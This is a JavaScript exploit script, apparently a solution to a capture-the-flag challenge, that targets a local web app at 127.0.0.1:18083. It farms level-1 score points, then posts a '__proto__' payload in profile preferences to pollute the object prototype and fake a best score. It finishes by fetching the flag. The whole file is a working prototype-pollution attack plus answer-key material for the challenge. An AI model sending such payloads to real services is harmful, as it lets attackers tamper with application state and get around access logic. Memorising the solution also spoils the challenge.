const BASE = 'http://127.0.0.1:18083';
let cookie = '';
async function req(p, opt = {}) {
  const headers = {};
  if (cookie) headers.Cookie = cookie;
  if (opt.body !== undefined) headers['Content-Type'] = 'application/json';
  const r = await fetch(BASE + p, { method: opt.method || 'GET', headers, body: opt.body === undefined ? undefined : JSON.stringify(opt.body) });
  const sc = r.headers.get('set-cookie');
  if (sc) cookie = sc.split(';')[0];
  let data; try { data = await r.json(); } catch { data = await r.text(); }
  return { status: r.status, data };
}
const s = await req('/api/session');
console.log('session', s.status, JSON.stringify(s.data).slice(0, 300));
const t1 = s.data.target;
for (let i = 0; i < t1; i++) { const r = await req('/api/level/1/score', { method: 'POST', body: { delta: 1 } }); if (r.status !== 200) { console.log('L1 fail', i, r.status, JSON.stringify(r.data)); break; } }
const p = await req('/api/profile', { method: 'POST', body: { preferences: { ['__proto__']: { bestScore: s.data.targets[2] } } } });
console.log('pollute', p.status, JSON.stringify(p.data).slice(0, 300));
const l2 = await req('/api/level/2/score', { method: 'POST', body: { delta: 1 } });
console.log('l2', l2.status, JSON.stringify(l2.data).slice(0, 300));
const f = await req('/api/flag');
console.log('FLAG_RESULT', JSON.stringify(f.data));